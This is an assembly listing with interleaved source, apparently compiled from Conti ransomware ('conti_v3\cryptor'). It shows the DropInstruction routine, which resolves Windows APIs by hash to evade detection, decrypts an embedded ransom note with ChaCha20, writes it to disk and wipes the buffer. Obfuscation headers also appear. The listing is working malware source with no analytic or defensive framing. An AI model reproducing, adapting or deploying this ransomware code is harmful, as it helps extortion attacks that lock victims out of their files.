  00148	48 8d 4d a0	 lea	 rcx, QWORD PTR Filename$[rbp-256]
  0014c	4c 8b c7	 mov	 r8, rdi
  0014f	e8 00 00 00 00	 call	 ?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ; MakePath
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00154	48 83 7d b8 07	 cmp	 QWORD PTR Filename$[rbp-232], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  00159	48 8d 7d a0	 lea	 rdi, QWORD PTR Filename$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 174  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));

  0015d	ba 0f 00 00 00	 mov	 edx, 15
  00162	41 b8 e8 10 76
	01		 mov	 r8d, 24514792		; 017610e8H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2236 :         if (_Large_mode_engaged()) {

  00168	48 0f 47 7d a0	 cmova	 rdi, QWORD PTR Filename$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 174  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));

  0016d	44 8d 4a 52	 lea	 r9d, QWORD PTR [rdx+82]
  00171	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  00176	48 89 5c 24 30	 mov	 QWORD PTR [rsp+48], rbx
  0017b	45 33 c9	 xor	 r9d, r9d
  0017e	89 5c 24 28	 mov	 DWORD PTR [rsp+40], ebx
  00182	45 33 c0	 xor	 r8d, r8d
  00185	ba 00 00 00 40	 mov	 edx, 1073741824		; 40000000H
  0018a	c7 44 24 20 02
	00 00 00	 mov	 DWORD PTR [rsp+32], 2
  00192	48 8b cf	 mov	 rcx, rdi
  00195	ff d0		 call	 rax
  00197	4c 8b e0	 mov	 r12, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 117  : 	if (hFile == INVALID_HANDLE_VALUE) {

  0019a	48 83 f8 ff	 cmp	 rax, -1
  0019e	0f 84 ea 01 00
	00		 je	 $LN293@DropInstru

; 130  : 	memcpy(&dwDecryptNote, DecryptNote + 40, 4);

  001a4	44 8b 2d 28 00
	00 00		 mov	 r13d, DWORD PTR ?g_DecryptNote@@3PADA+40
  001ab	0f 28 3d 00 00
	00 00		 movaps	 xmm7, XMMWORD PTR ?g_DecryptNote@@3PADA
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  001b2	41 8b cd	 mov	 ecx, r13d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 128  : 	memcpy(ChaChaKey, DecryptNote, 32);

  001b5	0f 28 35 10 00
	00 00		 movaps	 xmm6, XMMWORD PTR ?g_DecryptNote@@3PADA+16

; 129  : 	memcpy(ChaChaIV, DecryptNote + 32, 8);

  001bc	48 8b 1d 20 00
	00 00		 mov	 rbx, QWORD PTR ?g_DecryptNote@@3PADA+32
  001c3	0f 11 7d 08	 movups	 XMMWORD PTR ChaChaKey$[rbp-256], xmm7
  001c7	48 89 5c 24 58	 mov	 QWORD PTR ChaChaIV$[rsp], rbx
  001cc	0f 11 75 18	 movups	 XMMWORD PTR ChaChaKey$[rbp-240], xmm6
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  001d0	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  001d5	45 8b c5	 mov	 r8d, r13d
  001d8	33 d2		 xor	 edx, edx
  001da	48 8b c8	 mov	 rcx, rax
  001dd	4c 8b f0	 mov	 r14, rax
  001e0	e8 00 00 00 00	 call	 memset
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 133  : 	if (!DecryptNotePlainText) {

  001e5	4d 85 f6	 test	 r14, r14
  001e8	0f 85 c0 00 00
	00		 jne	 $LN3@DropInstru
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  001ee	41 8d 56 0f	 lea	 edx, QWORD PTR [r14+15]
  001f2	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  001f8	45 8d 4e 5b	 lea	 r9d, QWORD PTR [r14+91]
  001fc	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  00201	49 8b cc	 mov	 rcx, r12
  00204	ff d0		 call	 rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00206	48 8b 55 b8	 mov	 rdx, QWORD PTR Filename$[rbp-232]
  0020a	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  0020e	76 36		 jbe	 SHORT $LN159@DropInstru
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00210	48 8b 4d a0	 mov	 rcx, QWORD PTR Filename$[rbp-256]
  00214	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  0021c	48 8b c1	 mov	 rax, rcx

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0021f	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00226	72 19		 jb	 SHORT $LN158@DropInstru

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00228	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  0022c	48 83 c2 27	 add	 rdx, 39			; 00000027H
  00230	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00233	48 83 c0 f8	 add	 rax, -8
  00237	48 83 f8 1f	 cmp	 rax, 31
  0023b	0f 87 2a 02 00
	00		 ja	 $LN258@DropInstru
$LN158@DropInstru:

; 268  :         ::operator delete(_Ptr, _Bytes);

  00241	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN159@DropInstru:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00246	48 8b 56 18	 mov	 rdx, QWORD PTR [rsi+24]

; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0024a	33 ff		 xor	 edi, edi
  0024c	66 0f 6f 05 00
	00 00 00	 movdqa	 xmm0, XMMWORD PTR __xmm@00000000000000070000000000000000
  00254	66 89 7d a0	 mov	 WORD PTR Filename$[rbp-256], di
  00258	f3 0f 7f 45 b0	 movdqu	 XMMWORD PTR Filename$[rbp-240], xmm0

; 2244 :         return _Myres > _Small_string_capacity;

  0025d	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00261	76 37		 jbe	 SHORT $LN188@DropInstru
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00263	48 8b 0e	 mov	 rcx, QWORD PTR [rsi]
  00266	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0026e	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00275	72 1e		 jb	 SHORT $LN187@DropInstru

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00277	48 8b 79 f8	 mov	 rdi, QWORD PTR [rcx-8]
  0027b	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0027f	48 2b cf	 sub	 rcx, rdi

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00282	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00286	48 83 f8 1f	 cmp	 rax, 31
  0028a	0f 87 db 01 00
	00		 ja	 $LN258@DropInstru

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00290	48 8b cf	 mov	 rcx, rdi
  00293	33 ff		 xor	 edi, edi
$LN187@DropInstru:

; 268  :         ::operator delete(_Ptr, _Bytes);

  00295	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN188@DropInstru:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  0029a	48 89 7e 10	 mov	 QWORD PTR [rsi+16], rdi

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  0029e	48 c7 46 18 07
	00 00 00	 mov	 QWORD PTR [rsi+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  002a6	66 89 3e	 mov	 WORD PTR [rsi], di
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 136  : 		return;

  002a9	e9 7b 01 00 00	 jmp	 $LN265@DropInstru
$LN3@DropInstru:
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  002ae	33 c0		 xor	 eax, eax
  002b0	48 8d 7d c0	 lea	 rdi, QWORD PTR CryptCtx$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c

; 45   :     x->input[10] = U8TO32_LITTLE(k + 8);

  002b4	66 0f 6f c6	 movdqa	 xmm0, xmm6

; 194  :     ECRYPT_encrypt_bytes(x, c, m, bytes);

  002b8	48 8d 15 2c 00
	00 00		 lea	 rdx, OFFSET FLAT:?g_DecryptNote@@3PADA+44

; 45   :     x->input[10] = U8TO32_LITTLE(k + 8);

  002bf	66 0f 73 d8 08	 psrldq	 xmm0, 8
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  002c4	b9 40 00 00 00	 mov	 ecx, 64			; 00000040H
  002c9	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c

; 33   :     x->input[5] = U8TO32_LITTLE(k + 4);

  002cb	8b 45 0c	 mov	 eax, DWORD PTR ChaChaKey$[rbp-252]

; 194  :     ECRYPT_encrypt_bytes(x, c, m, bytes);

  002ce	48 8d 4d c0	 lea	 rcx, QWORD PTR CryptCtx$[rbp-256]

; 33   :     x->input[5] = U8TO32_LITTLE(k + 4);

  002d2	89 45 d4	 mov	 DWORD PTR CryptCtx$[rbp-236], eax

; 194  :     ECRYPT_encrypt_bytes(x, c, m, bytes);

  002d5	45 8b cd	 mov	 r9d, r13d

; 35   :     x->input[7] = U8TO32_LITTLE(k + 12);

  002d8	8b 45 14	 mov	 eax, DWORD PTR ChaChaKey$[rbp-244]

; 194  :     ECRYPT_encrypt_bytes(x, c, m, bytes);

  002db	4d 8b c6	 mov	 r8, r14

; 35   :     x->input[7] = U8TO32_LITTLE(k + 12);

  002de	89 45 dc	 mov	 DWORD PTR CryptCtx$[rbp-228], eax

; 44   :     x->input[9] = U8TO32_LITTLE(k + 4);

  002e1	8b 45 1c	 mov	 eax, DWORD PTR ChaChaKey$[rbp-236]
  002e4	89 45 e4	 mov	 DWORD PTR CryptCtx$[rbp-220], eax

; 55   :     x->input[12] = 0;

  002e7	33 c0		 xor	 eax, eax

; 32   :     x->input[4] = U8TO32_LITTLE(k + 0);

  002e9	66 0f 7e 7d d0	 movd	 DWORD PTR CryptCtx$[rbp-240], xmm7

; 36   :     if (kbits == 256) { /* recommended */
; 37   :         k += 16;
; 38   :         constants = sigma;
; 39   :     }
; 40   :     else { /* kbits == 128 */
; 41   :         constants = tau;
; 42   :     }
; 43   :     x->input[8] = U8TO32_LITTLE(k + 0);

  002ee	66 0f 7e 75 e0	 movd	 DWORD PTR CryptCtx$[rbp-224], xmm6

; 55   :     x->input[12] = 0;

  002f3	48 89 45 f0	 mov	 QWORD PTR CryptCtx$[rbp-208], rax

; 58   :     x->input[15] = U8TO32_LITTLE(iv + 4);

  002f7	8b 44 24 5c	 mov	 eax, DWORD PTR ChaChaIV$[rsp+4]

; 34   :     x->input[6] = U8TO32_LITTLE(k + 8);

  002fb	66 0f 73 df 08	 psrldq	 xmm7, 8

; 46   :     x->input[11] = U8TO32_LITTLE(k + 12);

  00300	66 0f 73 de 0c	 psrldq	 xmm6, 12

; 58   :     x->input[15] = U8TO32_LITTLE(iv + 4);

  00305	89 45 fc	 mov	 DWORD PTR CryptCtx$[rbp-196], eax

; 34   :     x->input[6] = U8TO32_LITTLE(k + 8);

  00308	66 0f 7e 7d d8	 movd	 DWORD PTR CryptCtx$[rbp-232], xmm7

; 45   :     x->input[10] = U8TO32_LITTLE(k + 8);

  0030d	66 0f 7e 45 e8	 movd	 DWORD PTR CryptCtx$[rbp-216], xmm0

; 46   :     x->input[11] = U8TO32_LITTLE(k + 12);

  00312	66 0f 7e 75 ec	 movd	 DWORD PTR CryptCtx$[rbp-212], xmm6

; 47   :     x->input[0] = U8TO32_LITTLE(constants + 0);

  00317	c7 45 c0 65 78
	70 61		 mov	 DWORD PTR CryptCtx$[rbp-256], 1634760805 ; 61707865H

; 48   :     x->input[1] = U8TO32_LITTLE(constants + 4);

  0031e	c7 45 c4 6e 64
	20 33		 mov	 DWORD PTR CryptCtx$[rbp-252], 857760878 ; 3320646eH

; 49   :     x->input[2] = U8TO32_LITTLE(constants + 8);

  00325	c7 45 c8 32 2d
	62 79		 mov	 DWORD PTR CryptCtx$[rbp-248], 2036477234 ; 79622d32H

; 50   :     x->input[3] = U8TO32_LITTLE(constants + 12);

  0032c	c7 45 cc 74 65
	20 6b		 mov	 DWORD PTR CryptCtx$[rbp-244], 1797285236 ; 6b206574H

; 57   :     x->input[14] = U8TO32_LITTLE(iv + 0);

  00333	89 5d f8	 mov	 DWORD PTR CryptCtx$[rbp-200], ebx

; 194  :     ECRYPT_encrypt_bytes(x, c, m, bytes);

  00336	e8 00 00 00 00	 call	 ECRYPT_encrypt_bytes
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 122  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x088f1e18, 102);//GetProcAddress(hKernel32, OBFA("WriteFile"));

  0033b	ba 0f 00 00 00	 mov	 edx, 15
  00340	41 b8 18 1e 8f
	08		 mov	 r8d, 143597080		; 088f1e18H
  00346	44 8d 4a 57	 lea	 r9d, QWORD PTR [rdx+87]
  0034a	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 123  : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  0034f	33 db		 xor	 ebx, ebx
  00351	4c 8d 4d 00	 lea	 r9, QWORD PTR BytesWritten$[rbp-256]
  00355	45 8b c5	 mov	 r8d, r13d
  00358	48 89 5c 24 20	 mov	 QWORD PTR [rsp+32], rbx
  0035d	49 8b d6	 mov	 rdx, r14
  00360	49 8b cc	 mov	 rcx, r12
  00363	ff d0		 call	 rax

; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  00365	8d 53 0f	 lea	 edx, QWORD PTR [rbx+15]
  00368	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  0036e	44 8d 4b 5b	 lea	 r9d, QWORD PTR [rbx+91]
  00372	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 229  : 	return pFunction(hObject);

  00377	49 8b cc	 mov	 rcx, r12
  0037a	ff d0		 call	 rax
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0037c	33 c0		 xor	 eax, eax
  0037e	49 8b cd	 mov	 rcx, r13
  00381	49 8b fe	 mov	 rdi, r14
  00384	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 150  : 	free(DecryptNotePlainText);

  00386	49 8b ce	 mov	 rcx, r14
  00389	e8 00 00 00 00	 call	 free
$LN293@DropInstru:

; 151  : }

  0038e	48 8b 55 b8	 mov	 rdx, QWORD PTR Filename$[rbp-232]
  00392	48 83 fa 07	 cmp	 rdx, 7
  00396	76 36		 jbe	 SHORT $LN233@DropInstru
  00398	48 8b 4d a0	 mov	 rcx, QWORD PTR Filename$[rbp-256]
  0039c	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  003a4	48 8b c1	 mov	 rax, rcx
  003a7	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  003ae	72 19		 jb	 SHORT $LN232@DropInstru
  003b0	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  003b4	48 83 c2 27	 add	 rdx, 39			; 00000027H
  003b8	48 2b c1	 sub	 rax, rcx
  003bb	48 83 c0 f8	 add	 rax, -8
  003bf	48 83 f8 1f	 cmp	 rax, 31
  003c3	0f 87 a2 00 00
	00		 ja	 $LN258@DropInstru
$LN232@DropInstru:
  003c9	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN233@DropInstru:
  003ce	48 8b 56 18	 mov	 rdx, QWORD PTR [rsi+24]
  003d2	66 0f 6f 05 00
	00 00 00	 movdqa	 xmm0, XMMWORD PTR __xmm@00000000000000070000000000000000
  003da	66 89 5d a0	 mov	 WORD PTR Filename$[rbp-256], bx
  003de	f3 0f 7f 45 b0	 movdqu	 XMMWORD PTR Filename$[rbp-240], xmm0
  003e3	48 83 fa 07	 cmp	 rdx, 7
  003e7	76 31		 jbe	 SHORT $LN262@DropInstru
  003e9	48 8b 0e	 mov	 rcx, QWORD PTR [rsi]
  003ec	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  003f4	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  003fb	72 18		 jb	 SHORT $LN261@DropInstru
  003fd	48 8b 79 f8	 mov	 rdi, QWORD PTR [rcx-8]
  00401	48 83 c2 27	 add	 rdx, 39			; 00000027H
  00405	48 2b cf	 sub	 rcx, rdi
  00408	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  0040c	48 83 f8 1f	 cmp	 rax, 31
  00410	77 59		 ja	 SHORT $LN258@DropInstru
  00412	48 8b cf	 mov	 rcx, rdi
$LN261@DropInstru:
  00415	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN262@DropInstru:
  0041a	66 89 1e	 mov	 WORD PTR [rsi], bx
  0041d	48 c7 46 18 07
	00 00 00	 mov	 QWORD PTR [rsi+24], 7
  00425	48 89 5e 10	 mov	 QWORD PTR [rsi+16], rbx
$LN265@DropInstru:
  00429	0f 28 bc 24 30
	01 00 00	 movaps	 xmm7, XMMWORD PTR [rsp+304]
  00431	0f 28 b4 24 40
	01 00 00	 movaps	 xmm6, XMMWORD PTR [rsp+320]
  00439	4c 8b bc 24 98
	01 00 00	 mov	 r15, QWORD PTR [rsp+408]
  00441	4c 8b b4 24 90
	01 00 00	 mov	 r14, QWORD PTR [rsp+400]
  00449	4c 8b ac 24 88
	01 00 00	 mov	 r13, QWORD PTR [rsp+392]
  00451	48 8b 4d 28	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  00455	48 33 cc	 xor	 rcx, rsp
  00458	e8 00 00 00 00	 call	 __security_check_cookie
  0045d	48 81 c4 50 01
	00 00		 add	 rsp, 336		; 00000150H
  00464	41 5c		 pop	 r12
  00466	5f		 pop	 rdi
  00467	5e		 pop	 rsi
  00468	5b		 pop	 rbx
  00469	5d		 pop	 rbp
  0046a	c3		 ret	 0
$LN258@DropInstru:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0046b	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00470	cc		 int	 3
$LN289@DropInstru:
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ENDP ; DropInstruction
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
